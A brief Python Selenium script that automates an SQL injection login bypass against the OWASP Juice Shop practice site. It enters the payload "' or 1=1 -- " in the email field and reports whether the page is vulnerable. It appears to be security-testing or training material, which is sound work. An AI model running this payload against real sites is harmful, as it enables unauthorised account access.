from selenium import webdriver
import time 
from selenium.webdriver.common.keys import Keys
browser=webdriver.Firefox()
browser.get('https://juice-shop.herokuapp.com/#/login')
time.sleep(2)

browser.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click()
browser.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
password=browser.find_element_by_xpath('//*[@id="password"]')
text='sqlinjection'
for characters in text:
    password.send_keys(characters)
    time.sleep(0.3)
browser.find_element_by_xpath('//*[@id="loginButton"]').click()
time.sleep(3)
if browser.current_url=='https://juice-shop.herokuapp.com/#/login':
    print('login failed')
else:
    print("your page is vulnerable to sql injection")
